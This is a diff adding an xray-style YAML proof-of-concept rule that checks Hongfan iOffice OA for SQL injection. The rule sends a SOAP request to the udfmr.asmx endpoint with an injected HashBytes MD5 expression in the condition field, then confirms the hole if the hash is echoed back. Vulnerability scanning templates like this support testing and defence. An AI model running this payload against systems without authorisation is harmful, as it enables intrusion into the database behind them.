@@ -1,0 +1,24 @@
+name: poc-yaml-hongfan-oa-sqli
+binding: 0e999b80-5f10-48c4-b78e-53ffa21a68e7
+manual: true
+detail:
+    author: xiaobaicai
+    links:
+        - https://planet.vulbox.com/detail/MTEyNjk=
+    vulnerability:
+        id: CT-469718
+        level: high
+transport: http
+set:
+    a: randomInt(1000000000, 9000000000)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /iOffice/prg/set/wss/udfmr.asmx
+            headers:
+                Content-Type: text/xml; charset=utf-8
+            body: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\r\n<soap:Body>\r\n<GetEmpSearch xmlns=\"http://tempuri.org/ioffice/udfmr\">\r\n<condition>1=substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{a}}')),3,32)</condition>\r\n</GetEmpSearch>\r\n</soap:Body>\r\n</soap:Envelope>"
+        expression: response.status == 500 && response.body.bcontains(bytes(md5(string(a))))
+expression: r0()
